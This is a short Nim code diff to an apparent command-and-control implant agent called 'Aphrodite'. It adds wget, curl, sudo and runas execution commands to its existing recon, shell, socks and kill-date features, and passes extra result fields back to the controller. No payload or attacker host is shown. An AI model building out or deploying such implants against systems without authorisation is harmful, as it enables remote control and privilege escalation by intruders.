@@ -19,6 +19,8 @@ import commands/recon/arp, commands/recon/hostname, commands/recon/ifconfig
 import commands/recon/nslookup, commands/recon/ps, commands/recon/uptime
 import commands/recon/whoami, commands/recon/netstat
 import commands/execution/psh, commands/execution/shell
+import commands/execution/wget, commands/execution/curl
+import commands/execution/sudo, commands/execution/runas
 import commands/env/env, commands/env/getenv, commands/env/setenv
 import commands/control/echo_cmd, commands/control/exit_cmd, commands/control/kill_cmd
 import commands/control/sleep_cmd, commands/control/socks
@@ -78,6 +80,8 @@ proc newAphroditeAgent*(): AphroditeAgent =
   initGetenv();   initSetenv()
   initDownload(); initUpload()
   initPsh();      initSocks()
+  initWget();     initCurl()
+  initSudo();     initRunas()
   initChmod();    initChown();    initFind();     initWrite()
   initJobs();     initJobkill();  initConfig()
 
@@ -299,6 +303,9 @@ proc dispatchTask(ag: AphroditeAgent, task: JsonNode): JsonNode =
     "completed":   res.completed,
     "status":      res.status,
   }
+  if not res.extraFields.isNil and res.extraFields.kind == JObject:
+    for key, val in res.extraFields.pairs:
+      result[key] = val
 
 proc checkKilldate(ag: AphroditeAgent) =
   if KillDate.len == 0: return
